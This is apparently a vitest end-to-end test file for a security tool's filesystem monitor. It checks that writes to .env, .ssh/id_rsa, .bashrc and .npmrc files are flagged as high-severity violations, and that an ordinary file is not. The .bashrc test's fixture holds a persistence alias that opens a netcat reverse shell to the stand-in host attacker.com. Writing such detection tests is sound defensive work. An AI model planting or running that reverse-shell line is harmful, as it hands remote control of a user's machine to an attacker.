// E2E-001: Live Filesystem Detection
// Proves ARP's FilesystemMonitor detects real file operations on disk.
// No event injection — the monitor itself detects real OS activity.
//
// ATLAS: AML.T0057, AML.T0018
// OWASP: A07, A04

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';
import { ArpWrapper } from '../../../src/oasb/harness/arp-wrapper';

describe('E2E-001: Live Filesystem Detection', () => {
  let arp: ArpWrapper;
  let watchDir: string;

  beforeEach(async () => {
    // Create a temp directory to watch
    watchDir = fs.mkdtempSync(path.join(os.tmpdir(), 'arp-e2e-fs-'));

    arp = new ArpWrapper({
      monitors: {
        process: false,
        network: false,
        filesystem: true,
      },
      filesystemWatchPaths: [watchDir],
    });
    await arp.start();

    // Give fs.watch a moment to initialize
    await new Promise((r) => setTimeout(r, 200));
  });

  afterEach(async () => {
    await arp.stop();
    try {
      fs.rmSync(watchDir, { recursive: true, force: true });
    } catch {
      // best effort
    }
  });

  it('should detect creation of a .env file as a sensitive path violation', async () => {
    // Write a real .env file to the watched directory
    const envPath = path.join(watchDir, '.env');
    fs.writeFileSync(envPath, 'SECRET_KEY=test123\n');

    // Wait for the filesystem monitor to pick it up
    const event = await arp.waitForEvent(
      (e) => e.source === 'filesystem' && e.data.sensitive === true,
      5000,
    );

    expect(event).toBeDefined();
    expect(event.source).toBe('filesystem');
    expect(event.category).toBe('violation');
    expect(event.severity).toBe('high');
    expect(event.data.sensitive).toBe(true);
    expect(String(event.data.path)).toContain('.env');
  });

  it('should detect creation of a .ssh directory file as sensitive', async () => {
    // Create a .ssh subdirectory and a key file
    const sshDir = path.join(watchDir, '.ssh');
    fs.mkdirSync(sshDir, { recursive: true });
    fs.writeFileSync(path.join(sshDir, 'id_rsa'), 'fake-private-key\n');

    const event = await arp.waitForEvent(
      (e) => e.source === 'filesystem' && String(e.data.path).includes('.ssh'),
      5000,
    );

    expect(event).toBeDefined();
    expect(event.category).toBe('violation');
    expect(event.severity).toBe('high');
    expect(event.data.sensitive).toBe(true);
  });

  it('should detect .bashrc write as persistence attempt', async () => {
    const bashrcPath = path.join(watchDir, '.bashrc');
    fs.writeFileSync(bashrcPath, 'alias backdoor="nc -e /bin/sh attacker.com 4444"\n');

    const event = await arp.waitForEvent(
      (e) => e.source === 'filesystem' && String(e.data.path).includes('.bashrc'),
      5000,
    );

    expect(event).toBeDefined();
    expect(event.category).toBe('violation');
    expect(event.severity).toBe('high');
  });

  it('should detect .npmrc credential file access', async () => {
    const npmrcPath = path.join(watchDir, '.npmrc');
    fs.writeFileSync(npmrcPath, '//registry.npmjs.org/:_authToken=npm_FAKE\n');

    const event = await arp.waitForEvent(
      (e) => e.source === 'filesystem' && String(e.data.path).includes('.npmrc'),
      5000,
    );

    expect(event).toBeDefined();
    expect(event.category).toBe('violation');
    expect(event.severity).toBe('high');
    expect(event.data.sensitive).toBe(true);
  });

  it('should allow normal file creation without triggering violations', async () => {
    // Create a normal, non-sensitive file
    const normalPath = path.join(watchDir, 'output.json');
    fs.writeFileSync(normalPath, '{"status": "ok"}\n');

    // Wait briefly for any potential events
    await new Promise((r) => setTimeout(r, 1500));

    // Should NOT have any violations
    const violations = arp.collector.eventsByCategory('violation');
    expect(violations.length).toBe(0);

    // Might have a normal 'rename' event from fs.watch
    const allEvents = arp.collector.getEvents();
    for (const event of allEvents) {
      expect(event.category).not.toBe('violation');
      expect(event.category).not.toBe('threat');
    }
  });
});
